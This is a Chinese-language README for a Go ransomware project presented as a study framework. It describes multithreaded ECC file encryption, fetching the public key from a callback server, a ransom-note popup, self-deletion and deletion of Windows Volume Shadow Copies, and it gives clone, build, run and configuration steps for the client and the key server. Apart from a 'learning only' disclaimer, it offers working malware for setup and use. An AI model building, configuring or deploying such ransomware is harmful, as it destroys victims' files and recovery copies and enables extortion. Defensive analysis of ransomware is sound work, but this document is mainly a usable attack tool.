
# Ransomware-For-Study

项目描述：

这是一个用于学习目的的勒索软件基本项目框架，用来在网络安全领域对抗恶意软件时能更有思路，也为网络安全中恶意代码分析的初学者提供一个基础的勒索软件攻击流程。


注意：

    本项目仅供学习，严禁用于任何非法用途，违者与作者本人无关!

---

## 项目特点

1. 创建互斥体实现防止用户多次点击

2. 使用ecc加密，公钥和私钥单独保存，加密过程中只有公钥会被捕捉

3. 实现了多线程对多个文件同时加密

4. 实现了加密之后弹出记事本的功能

5. 加密之后自删除文件

6. 公钥传输使用https

7. 删除系统卷影功能

8. 多种加密方式实现

---

**todo（未完成）：**

多文件夹轮询


## 安装

**强调：**

本项目仅在windows操作系统下可用！

### 1. 下载项目

```bash
git clone https://github.com/CuteCuteYu/RansomwareFS
```

### 2. 初始化项目
```bash
cd  RansomwareFS
```

```bash
go mod tidy
```

### 3. 启动公钥发送的服务端

**建议：启动前将ssl证书替换成其他来源的**

替换地址：

`ssl-cert`文件夹

```bash
go run ./server.go ./handler.go
```

### 4. 配置选项

#### 4.1 加密的文件后缀名和加密线程设置还有加密方式设置

`./client/client.go`

```bash
const (
	Method        string = "CUSTOM"
	FileExtension        = ".exe"
	ThreadNumber         = 10 // Number of threads to use for encryption
	FilePath      string = ""
)
```

#### 4.2 设置回连服务端来获得公钥的地址和端口

`./client/get_pub_key/get_pub_key.go`

```go
const (
	ServerAddr = "localhost"
	ServerPort = "8080"
)
```

#### 4.3 设置互斥体名称

`./client/mutex/mutex.go`

```go
mutexName := "Global\\mypkg_mutex"
```

### 5. 运行或者编译客户端

#### 5.1 直接运行

（以管理员身份运行即可使用删除卷影功能）

```bash
go run ./cmd/client/main.go
```

#### 5.2 编译
```bash
go build ./cmd/client/main.go
```

### 6. 加密方式拓展编写

`./client/custom_example/custom_example.go`即是编写案例

需要编写的参数

```go
// 凯撒加密
// 参数:
//   - data: 需要加密的字节数组
//   - shift: 加密方式中可能涉及到的自定义选项
// 返回值:
//   - 加密之后的字节数组
func CaesarEncrypt(data []byte, shift int) []byte {
	encrypted := make([]byte, len(data))
	for i, b := range data {
		encrypted[i] = byte((int(b) + shift) % 256)
	}
	return encrypted
}
```